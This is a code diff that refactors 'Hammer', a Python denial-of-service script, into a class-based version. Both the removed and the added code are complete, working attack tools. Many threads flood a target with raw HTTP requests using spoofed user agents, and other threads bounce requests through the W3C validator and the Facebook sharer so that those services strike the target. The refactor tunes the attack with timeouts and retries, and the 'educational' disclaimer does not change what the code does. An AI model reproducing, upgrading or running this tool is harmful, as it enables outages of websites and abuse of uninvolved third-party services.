@@ -1,185 +1,192 @@
-##########################################
-#! /usr/bin/python3                      #
-# -=- coding: utf-8 -=-                  #
-#                                        #
-# python 3.3.2+ Hammer Dos Script v.1    #
-# by cybsam                              #
-# only for legal purpose                 #
-# https://github.com/cybsam/web-hammer   #
-##########################################
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 
-from queue import Queue
-from optparse import OptionParser
-import time,sys,os,socket,threading,logging,urllib.request,random
+"""
+Web Hammer Script 
 
+Original by shuvo-halder: https://github.com/shuvo-halder/web-hammer
+Upgraded by BinRecon: https://github.com/BinRecon
+Refactored to demonstrate modern Python best practices.
 
-def user_agent():
-	global uagent
-	uagent=[]
-	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
-	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
-	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
-	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
-	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
-	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
-	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
-	return(uagent)
+DISCLAIMER: This is a Denial-of-Service (DoS) tool. Using it against any
+website or server without explicit, written permission is illegal and unethical.
+This code is provided for educational purposes ONLY. Do not use it for any
+malicious activities. You are solely responsible for your actions.
+"""
 
+import argparse
+import logging
+import random
+import socket
+import sys
+import threading
+import time
+import urllib.request
+from urllib.error import URLError
 
-def my_bots():
-	global bots
-	bots=[]
-	bots.append("http://validator.w3.org/check?uri=")
-	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
-	return(bots)
+# --- Configuration Constants ---
+DEFAULT_HEADERS = """Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: keep-alive
+"""
 
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
+]
 
-def bot_hammering(url):
-	try:
-		while True:
-			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is hammering...\033[0m")
-			time.sleep(.1)
-	except:
-		time.sleep(.1)
-
-
-def down_it(item):
-	try:
-		while True:
-			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((host,int(port)))
-			if s.sendto( packet, (host, int(port)) ):
-				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
-			else:
-				s.shutdown(1)
-				print("\033[91mshut<->down\033[0m")
-			time.sleep(.1)
-	except socket.error as e:
-		print("\033[91mno connection! server maybe down\033[0m")
-		#print("\033[91m",e,"\033[0m")
-		time.sleep(.1)
+PROXY_BOTS = [
+    "http://validator.w3.org/check?uri=",
+    "http://www.facebook.com/sharer/sharer.php?u=",
+]
 
 
-def dos():
-	while True:
-		item = q.get()
-		down_it(item)
-		q.task_done()
+class WebHammer:
+    """
+    A class to encapsulate the state and logic of the web hammering tool.
+    """
+
+    def __init__(self, host: str, port: int, threads: int):
+        self.host = host
+        self.port = port
+        self.threads = threads
+        self.custom_headers = self._load_headers("headers.txt")
+        self.target_url = f"http://{host}:{port}"
+        self.is_running = False
+
+    def _load_headers(self, filename: str) -> str:
+        """Loads custom headers from a file, or returns a default string."""
+        try:
+            with open(filename, "r") as f:
+                logging.info(f"Successfully loaded custom headers from {filename}")
+                return f.read()
+        except FileNotFoundError:
+            logging.warning(f"'{filename}' not found. Using default headers.")
+            return DEFAULT_HEADERS
+        except IOError as e:
+            logging.error(f"Error reading {filename}: {e}. Using default headers.")
+            return DEFAULT_HEADERS
+
+    def _socket_hammer(self):
+        """Continuously sends raw TCP packets to the target host."""
+        logging.info(f"Socket hammering thread started for {self.host}:{self.port}")
+        packet_template = (
+            f"GET / HTTP/1.1\r\n"
+            f"Host: {self.host}\r\n"
+            f"{self.custom_headers}\r\n"
+            f"User-Agent: {{user_agent}}\r\n\r\n"
+        ).encode('utf-8')
+
+        while self.is_running:
+            try:
+                # Reuse socket for efficiency within the thread's loop
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                    s.settimeout(2)
+                    s.connect((self.host, self.port))
+                    
+                    # Use .send() for TCP, not .sendto()
+                    packet = packet_template.format(user_agent=random.choice(USER_AGENTS))
+                    s.send(packet)
+                    logging.debug(f"Packet sent to {self.host}:{self.port}")
+            except (socket.error, ConnectionRefusedError, socket.timeout) as e:
+                logging.error(f"Socket error: {e}. Server may be down or blocking.")
+                time.sleep(5) # Wait a bit longer if connection fails
+            except Exception as e:
+                logging.error(f"An unexpected error occurred in socket_hammer: {e}")
+            
+            time.sleep(0.1)
+
+    def _proxy_hammer(self):
+        """Continuously sends requests through third-party proxy services."""
+        logging.info(f"Proxy hammering thread started for {self.host}")
+        while self.is_running:
+            try:
+                bot_url = random.choice(PROXY_BOTS) + self.target_url
+                headers = {'User-Agent': random.choice(USER_AGENTS)}
+                req = urllib.request.Request(bot_url, headers=headers)
+                # Using a timeout is crucial to prevent hanging
+                with urllib.request.urlopen(req, timeout=5) as response:
+                    logging.debug(f"Proxy request sent via {bot_url} - Status: {response.getcode()}")
+            except (URLError, socket.timeout) as e:
+                logging.error(f"Proxy request failed: {e}")
+            except Exception as e:
+                logging.error(f"An unexpected error occurred in proxy_hammer: {e}")
+            
+            time.sleep(0.1)
+
+    def _start_threads(self):
+        """Initializes and starts the hammering threads."""
+        self.is_running = True
+        for i in range(self.threads):
+            # Socket-based hammering threads
+            t1 = threading.Thread(target=self._socket_hammer, daemon=True)
+            t1.start()
+            # Proxy-based hammering threads
+            t2 = threading.Thread(target=self._proxy_hammer, daemon=True)
+            t2.start()
+        logging.info(f"Started {self.threads * 2} threads ({self.threads} for each method).")
+
+    def run(self):
+        """Starts the attack and keeps the main thread alive."""
+        print("\033[92m" + "="*40 + "\033[0m")
+        print(f"\033[94mTarget:    \033[0m {self.target_url}")
+        print(f"\033[94mThreads:   \033[0m {self.threads * 2} (total)")
+        print("\033[92m" + "="*40 + "\033[0m")
+        print("\033[91mAttack is running. Press CTRL+C to stop.\033[0m")
+
+        self._start_threads()
+
+        try:
+            # Keep the main thread alive while daemon threads do the work
+            while self.is_running:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            logging.info("\nCTRL+C received. Shutting down...")
+            self.is_running = False
+            # Wait for threads to finish their current loop iteration
+            time.sleep(2)
+            logging.info("Hammer stopped.")
+            sys.exit(0)
 
 
-def dos2():
-	while True:
-		item=w.get()
-		bot_hammering(random.choice(bots)+"http://"+host)
-		w.task_done()
+def main():
+    """Main function to parse arguments and start the tool."""
+    parser = argparse.ArgumentParser(
+        description="A Layer 7 DoS stress testing tool (for educational purposes only).",
+        epilog="Use this script responsibly and only on systems you are authorized to test."
+    )
+    parser.add_argument(
+        "-s", "--server", required=True, help="Target server IP or domain name."
+    )
+    parser.add_argument(
+        "-p", "--port", type=int, default=80, help="Target port (default: 80)."
+    )
+    parser.add_argument(
+        "-t", "--threads", type=int, default=50, help="Number of threads per method (default: 50)."
+    )
+    parser.add_argument(
+        "-q", "--quiet", action="store_const", dest="loglevel", const=logging.ERROR,
+        default=logging.INFO, help="Set logging to ERROR level (quiet mode)."
+    )
+
+    args = parser.parse_args()
+    logging.basicConfig(level=args.loglevel, format="%(asctime)s - %(levelname)s - %(message)s")
+
+    # Initial connection check
+    try:
+        logging.info(f"Checking connection to {args.server}:{args.port}...")
+        with socket.create_connection((args.server, args.port), timeout=5):
+            logging.info("Connection successful. Starting hammer.")
+    except (socket.error, socket.timeout) as e:
+        logging.error(f"Could not connect to {args.server}:{args.port}. Error: {e}")
+        sys.exit(1)
+
+    hammer = WebHammer(host=args.server, port=args.port, threads=args.threads)
+    hammer.run()
 
 
-def usage():
-	print (''' \033[92m	Hammer Dos Script v.1 https://github.com/cybsam/web-hammer/
-	It is the end user's responsibility to obey all applicable laws.
-	It is just for server testing script. Your ip is visible. \n
-	usage : python3 hammer.py [-s] [-p] [-t]
-	-h : help
-	-s : server ip
-	-p : port default 80
-	-t : turbo default 135 \033[0m''')
-	sys.exit()
-
-
-def samHead():
-	os.system("clear")
-	print("")
-	os.system("figlet CybSam Script")
-	print("")
-	print("[ Hammering...       ]")
-	print("[                    ] 0% ")
-	time.sleep(1)
-	print("[=====               ] 25%")
-	time.sleep(1)
-	print("[==========          ] 50%")
-	time.sleep(0.75)
-	print("[===============     ] 75%")
-	time.sleep(0.50)
-	print("[====================] 100%")
-	time.sleep(0.25)
-
-
-def get_parameters():
-	global host
-	global port
-	global thr
-	global item
-	optp = OptionParser(add_help_option=False,epilog="Hammers")
-	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
-	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
-	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
-	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
-	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
-	opts, args = optp.parse_args()
-	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
-	if opts.help:
-		usage()
-	if opts.host is not None:
-		host = opts.host
-	else:
-		usage()
-	if opts.port is None:
-		port = 80
-	else:
-		port = opts.port
-	if opts.turbo is None:
-		thr = 135
-	else:
-		thr = opts.turbo
-
-
-# reading headers
-global data
-headers = open("headers.txt", "r")
-data = headers.read()
-headers.close()
-#task queue are q,w
-q = Queue()
-w = Queue()
-
-
-if __name__ == '__main__':
-	if len(sys.argv) < 2:
-		usage()
-	get_parameters()
-	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94mPlease wait...\033[0m")
-	samHead()
-	user_agent()
-	my_bots()
-	time.sleep(3)
-	try:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((host,int(port)))
-		s.settimeout(1)
-	except socket.error as e:
-		print("\033[91mcheck server ip and port\033[0m")
-		usage()
-	while True:
-		for i in range(int(thr)):
-			t = threading.Thread(target=dos)
-			t.daemon = True  # if thread is exist, it dies
-			t.start()
-			t2 = threading.Thread(target=dos2)
-			t2.daemon = True  # if thread is exist, it dies
-			t2.start()
-		start = time.time()
-		#tasking
-		item = 0
-		while True:
-			if (item>1800): # for no memory crash
-				item=0
-				time.sleep(.1)
-			item = item + 1
-			q.put(item)
-			w.put(item)
-		q.join()
-		w.join()
+if __name__ == "__main__":
+    main()
